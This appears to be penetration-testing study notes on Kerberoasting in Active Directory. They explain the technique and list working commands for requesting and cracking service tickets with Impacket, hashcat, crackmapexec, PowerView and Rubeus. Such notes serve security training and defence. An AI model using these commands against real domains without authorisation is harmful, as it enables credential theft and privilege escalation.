# Kerberoasting

Kerberoasting is a lateral movement and privilege escalation technique used in 
Active Directory environments. This attack specifically targets Service Principal 
Name (SPN) accounts.

## How It Works

- Services in Active Directory run under the context of service accounts, which
 often have elevated privileges.
- Any authenticated user can request a Kerberos ticket for these service accounts.
- The ticket (TGS-REP) is encrypted using the account's NTLM hash. This allows
 attackers to perform a brute-force attack on the ticket to recover the cleartext password.

## Requirements

To perform a Kerberoasting attack, you need one of the following:
- Cleartext password or NTLM hash of an account.
- A shell in the context of a domain user account.
- SYSTEM-level access on a domain-joined host.

## Performing the Attack

### From a Non-Domain Joined Linux Host

1. Use valid domain user credentials.

### From a Domain-Joined Linux Host

1. Execute commands as root after retrieving the keytab file.

### From a Domain-Joined Windows Host

1. Authenticate as a domain user.
2. Use a shell in the context of a domain account.

### From a Non-Domain Joined Windows Host

1. Use `runas /netonly` with valid domain credentials.

### As SYSTEM on a Domain-Joined Windows Host

1. Utilize SYSTEM-level access to execute commands.


## Attacking from Linux

```shell
# Retrieve SPNs
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/<username>
# Request tickets and save to file
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/<username> -request -outputfile tgs
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/<username> -request-user target_user
# Crack tickets using hashcat
hashcat -m 13100 <ticket_file> <wordlist_path>   # RC4 encryption
hashcat -m 19700 <ticket_file> <wordlist_path>   # AES encryption
# Validate credentials on the domain controller
crackmapexec smb $DC_IP -u <username> -p <password>
```

## Attacking from Windows

### Using PowerView

```shell
# Import PowerView module
Import-Module .\PowerView.ps1
# Retrieve SPNs
Get-DomainUser * -spn | Select-Object samaccountname
# Request ticket for a user
Get-DomainUser -Identity <username> | Get-DomainSPNTicket -Format Hashcat
# Get tickets for all users and export to CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | \
Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### Using Rubeus

```shell
# Retrieve stats
Rubeus.exe kerberoast /stats
# Request ticket for a user (RC4 encryption)
Rubeus.exe kerberoast /tgtdeleg /user:<username> /nowrap
```

## Hashing Algorithm

- Kerberoasting tools typically request `RC4 encryption` because it
 is weaker and faster to crack.
- RC4 hashes begin with `$krb5tgs$23$*`.
- AES-256 encrypted hashes start with `$krb5tgs$18$*` and take longer to crack.

```shell
# Check encryption type for a user
Get-DomainUser <username> -Properties samaccountname, \
serviceprincipalname, msds-supportedencryptiontypes
```

- If `msds-supportedencryptiontypes` is set to 0, RC4 encryption is used. If set to
 24, only AES 128/256 encryption types are supported.

### Notes

- **Windows Server 2019:** Always provides tickets encrypted with the highest supported
 encryption level of the target account.
- **Windows Server 2016 or Earlier:** Attackers can request RC4 encrypted tickets even 
if AES is enabled.